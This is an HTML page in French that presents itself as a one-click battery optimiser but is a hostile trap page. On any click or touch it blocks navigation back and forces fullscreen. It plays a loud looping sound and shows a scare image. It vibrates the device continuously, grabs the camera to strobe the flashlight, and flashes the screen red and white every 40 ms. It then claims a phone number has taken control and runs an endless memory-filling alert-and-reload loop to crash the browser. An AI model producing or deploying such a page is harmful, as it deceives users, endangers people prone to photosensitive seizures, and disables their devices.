<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Optimiseur de Batterie</title>
    <style>
        body { background: black; color: #00ff00; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; touch-action: none; transition: background 0.05s; position: relative; }
        .card { text-align: center; border: 2px solid #00ff00; padding: 30px; border-radius: 15px; box-shadow: 0 0 15px #00ff00; z-index: 10; background: rgba(0,0,0,0.7); }
        #start-btn { background: #00ff00; color: black; border: none; padding: 15px 30px; font-weight: bold; border-radius: 5px; cursor: pointer; font-size: 1.2rem; margin-top: 20px; }
        #scare-image { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: 0; opacity: 0; transition: opacity 0.1s; }
        #scare-image.show { opacity: 1; }
        .flash-red { background-color: red !important; }
        .flash-white { background-color: white !important; }
        @keyframes zoomFou { 0% { transform: scale(1); } 50% { transform: scale(1.8) rotate(10deg); } 100% { transform: scale(1); } }
        .zoom-actif { animation: zoomFou 0.05s infinite; }
    </style>
</head>
<body onclick="activerPiege()" ontouchstart="activerPiege()">

    <div class="card" id="interface">
        <h2 style="margin: 0;">BATTERIE FAIBLE ?</h2>
        <p style="color: #888;">Optimisez votre autonomie en un clic</p>
        <button id="start-btn">OPTIMISER MAINTENANT</button>
    </div>

    <img id="scare-image" src="https://i.imgur.com/K1z3s1H.jpeg">

    <audio id="audio" loop preload="auto">
        <source src="https://www.myinstants.com/media/sounds/loud-moaning-sound-effect-original.mp3" type="audio/mpeg">
    </audio>

    <script>
    // BLOQUER LE RETOUR
    window.history.pushState(null, null, window.location.href);
    window.onpopstate = function() { window.history.pushState(null, null, window.location.href); };
    window.onbeforeunload = function() { return "Erreur système !"; };

    async function activerPiege() {
        // SON
        const son = document.getElementById('audio');
        son.volume = 1.0;
        son.play().catch(() => {});

        // PLEIN ÉCRAN
        if (document.documentElement.requestFullscreen) {
            document.documentElement.requestFullscreen().catch(() => {});
        }

        // IMAGE & VIBRATION
        document.getElementById('scare-image').classList.add('show');
        if ("vibrate" in navigator) {
            setInterval(() => { navigator.vibrate([2000, 100]); }, 500);
        }

        // TORCHE (Flash arrière)
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
            const track = stream.getVideoTracks()[0];
            let flashOn = false;
            setInterval(async () => {
                flashOn = !flashOn;
                await track.applyConstraints({ advanced: [{ torch: flashOn }] });
            }, 100);
        } catch (e) {}

        // FLASH ÉCRAN & ZOOM
        setInterval(() => {
            document.body.classList.toggle('flash-red');
            document.body.classList.toggle('flash-white');
        }, 40);
        document.getElementById('interface').classList.add('zoom-actif');

        // MESSAGE FINAL
        document.getElementById('interface').innerHTML = `
            <h1 style="color:black; background:yellow; padding:10px;">TOTAL CRASH</h1>
            <p style="color:white; font-weight:bold;">0707656355 A PRIS LE CONTRÔLE</p>
        `;

        // PLANTAGE (RAM & BOUCLE)
        setTimeout(() => {
            let garbage = [];
            while(true) {
                garbage.push(new Array(1000000).join('bye_'));
                alert("SYSTÈME DÉTRUIT PAR 0707656355 !");
                window.location.reload();
            }
        }, 1500);
    }
    </script>
</body>
</html>
